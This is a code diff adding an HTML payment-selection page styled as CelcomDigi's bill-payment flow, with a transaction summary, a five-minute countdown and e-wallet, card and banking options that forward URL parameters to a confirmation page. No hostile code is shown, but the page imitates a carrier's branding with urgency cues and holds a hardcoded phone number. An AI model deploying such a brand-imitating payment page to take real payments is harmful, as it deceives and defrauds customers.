@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment Selection - CelcomDigi</title>
+  <link rel="icon" href="/get-assets/images/favicon.ico" type="image/x-icon" />
+  <style>
+    @import url('https://fonts.googleapis.com/css?family=Lato:400,700&display=swap');
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Lato', 'Helvetica Neue', Arial, sans-serif;
+      background: #f3f4f6;
+      color: #1a1a1a;
+      min-height: 100vh;
+    }
+
+    /* ===== HEADER ===== */
+    .header {
+      background: #001871;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .header-back {
+      background: rgba(255,255,255,0.15);
+      border: none;
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: #fff;
+      text-decoration: none;
+      transition: background 0.2s;
+    }
+    .header-back:hover { background: rgba(255,255,255,0.25); }
+    .header-logo {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .header-logo img { height: 28px; }
+
+    /* ===== TIMEOUT BADGE ===== */
+    .timeout-badge {
+      background: #fbbf24;
+      color: #1a1a1a;
+      font-size: 13px;
+      font-weight: 700;
+      padding: 4px 14px;
+      border-radius: 50px;
+      position: absolute;
+      top: 60px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 50;
+      white-space: nowrap;
+    }
+
+    /* ===== MAIN CARD ===== */
+    .main-wrapper {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 60px 16px 40px;
+    }
+
+    .summary-card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 24px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+    }
+    .summary-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .summary-divider {
+      border: none;
+      border-top: 1px solid #f3f4f6;
+      margin: 12px 0;
+    }
+    .summary-row {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+      margin-bottom: 12px;
+    }
+    .summary-row-label {
+      font-size: 12px;
+      color: #6b7280;
+    }
+    .summary-row-value {
+      font-size: 14px;
+      color: #1a1a1a;
+      font-weight: 500;
+    }
+    .summary-amount {
+      font-size: 32px;
+      font-weight: 700;
+      color: #1a1a1a;
+      text-align: center;
+      margin: 8px 0 16px;
+    }
+
+    /* ===== PAYMENT METHODS ===== */
+    .section-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 12px;
+    }
+    .payment-option {
+      background: #fff;
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      cursor: pointer;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      position: relative;
+    }
+    .payment-option:hover {
+      border-color: #015cc9;
+      box-shadow: 0 0 0 3px rgba(1,92,201,0.08);
+    }
+    .payment-option.selected {
+      border-color: #015cc9;
+      box-shadow: 0 0 0 3px rgba(1,92,201,0.12);
+    }
+    .payment-option input[type="radio"] {
+      position: absolute;
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    .payment-icon {
+      width: 44px;
+      height: 44px;
+      object-fit: contain;
+      flex-shrink: 0;
+    }
+    .payment-info { flex: 1; }
+    .payment-name {
+      font-size: 15px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 2px;
+    }
+    .payment-desc {
+      font-size: 12px;
+      color: #6b7280;
+    }
+    .radio-indicator {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #d1d5db;
+      border-radius: 50%;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: border-color 0.2s;
+    }
+    .payment-option.selected .radio-indicator {
+      border-color: #015cc9;
+    }
+    .radio-dot {
+      width: 10px;
+      height: 10px;
+      background: #015cc9;
+      border-radius: 50%;
+      display: none;
+    }
+    .payment-option.selected .radio-dot { display: block; }
+
+    /* ===== NEXT BUTTON ===== */
+    .btn-next {
+      width: 100%;
+      background: linear-gradient(90.25deg, #338ffd 0.24%, #015cc9 57.47%);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'Lato', sans-serif;
+      margin-top: 20px;
+      transition: opacity 0.2s;
+    }
+    .btn-next:hover { opacity: 0.9; }
+    .btn-next:disabled {
+      background: #d1d5db;
+      color: #9ca3af;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="header" style="position:relative;display:flex;align-items:center;">
+    <a href="javascript:history.back()" class="header-back">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+        <polyline points="15 18 9 12 15 6"/>
+      </svg>
+    </a>
+    <div class="header-logo">
+      <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" alt="CelcomDigi" />
+    </div>
+  </header>
+
+  <!-- TIMEOUT BADGE -->
+  <div class="timeout-badge">Timeout: <span id="timerDisplay">5:00</span></div>
+
+  <!-- MAIN WRAPPER -->
+  <div class="main-wrapper">
+
+    <!-- SUMMARY CARD -->
+    <div class="summary-card">
+      <h2 class="summary-title">Summary of transaction</h2>
+      <div class="summary-amount" id="summaryAmount">RM 0.00</div>
+      <hr class="summary-divider" />
+      <div class="summary-row">
+        <span class="summary-row-label">Pay to</span>
+        <span class="summary-row-value">CelcomDigi Telecommunications Sdn Bhd</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-row-label">Payment of</span>
+        <span class="summary-row-value" id="summaryPaymentOf">Bill Payment</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-row-label">Reference no. / Payment ID</span>
+        <span class="summary-row-value" id="summaryRef">NGOS-</span>
+      </div>
+    </div>
+
+    <!-- SELECT PAYMENT METHOD -->
+    <h3 class="section-title">Select payment method</h3>
+
+    <!-- e-Wallet -->
+    <div class="payment-option" id="opt-ewallet" onclick="selectPayment('ewallet')">
+      <input type="radio" name="payment" value="ewallet" />
+      <img class="payment-icon" src="/get-assets/images/e-wallet-04.svg" alt="e-Wallet" />
+      <div class="payment-info">
+        <div class="payment-name">e-Wallet</div>
+        <div class="payment-desc">Boost, GrabPay, ShopeePay, Touch n' Go</div>
+      </div>
+      <div class="radio-indicator"><div class="radio-dot"></div></div>
+    </div>
+
+    <!-- Credit / Debit Card -->
+    <div class="payment-option" id="opt-card" onclick="selectPayment('card')">
+      <input type="radio" name="payment" value="card" />
+      <img class="payment-icon" src="/get-assets/images/credit-card-02.svg" alt="Credit Card" />
+      <div class="payment-info">
+        <div class="payment-name">Credit / Debit Card</div>
+        <div class="payment-desc">Visa, Mastercard, American Express</div>
+      </div>
+      <div class="radio-indicator"><div class="radio-dot"></div></div>
+    </div>
+
+    <!-- Online Banking -->
+    <div class="payment-option" id="opt-banking" onclick="selectPayment('banking')">
+      <input type="radio" name="payment" value="banking" />
+      <img class="payment-icon" src="/get-assets/images/bank_1.svg" alt="Online Banking" />
+      <div class="payment-info">
+        <div class="payment-name">Online Banking</div>
+        <div class="payment-desc">All of your favourite banks and more</div>
+      </div>
+      <div class="radio-indicator"><div class="radio-dot"></div></div>
+    </div>
+
+    <button class="btn-next" id="nextBtn" disabled onclick="proceedNext()">Next</button>
+  </div>
+
+  <script>
+    // Get URL params
+    const params = new URLSearchParams(window.location.search);
+    const mobileNumber = params.get('number') || '60162556095';
+    const carrier = params.get('carrier') || 'DIGI';
+    const amount = parseFloat(params.get('amount') || '0');
+    const ref = params.get('ref') || ('NGOS' + Date.now());
+
+    // Fill summary
+    document.getElementById('summaryAmount').textContent = 'RM ' + amount.toFixed(2);
+    document.getElementById('summaryPaymentOf').textContent = 'RM ' + amount.toFixed(2) + ' Bill Payment for ' + mobileNumber;
+    document.getElementById('summaryRef').textContent = ref;
+
+    // Countdown timer (5 minutes)
+    let seconds = 5 * 60;
+    const timerEl = document.getElementById('timerDisplay');
+    const timerInterval = setInterval(() => {
+      seconds--;
+      if (seconds <= 0) {
+        clearInterval(timerInterval);
+        timerEl.textContent = '0:00';
+        alert('Session timed out. Please try again.');
+        window.location.href = '/bill';
+        return;
+      }
+      const m = Math.floor(seconds / 60);
+      const s = seconds % 60;
+      timerEl.textContent = m + ':' + String(s).padStart(2, '0');
+    }, 1000);
+
+    // Payment selection
+    let selectedMethod = null;
+    function selectPayment(method) {
+      // Remove selected from all
+      ['ewallet', 'card', 'banking'].forEach(m => {
+        document.getElementById('opt-' + m).classList.remove('selected');
+      });
+      // Add selected to chosen
+      document.getElementById('opt-' + method).classList.add('selected');
+      selectedMethod = method;
+      document.getElementById('nextBtn').disabled = false;
+    }
+
+    function proceedNext() {
+      if (!selectedMethod) return;
+      // Show processing and redirect
+      document.getElementById('nextBtn').textContent = 'Processing...';
+      document.getElementById('nextBtn').disabled = true;
+      setTimeout(() => {
+        // Redirect to confirmation page
+        window.location.href = `/payment-confirm?number=${encodeURIComponent(mobileNumber)}&carrier=${encodeURIComponent(carrier)}&amount=${amount}&ref=${ref}&method=${selectedMethod}`;
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
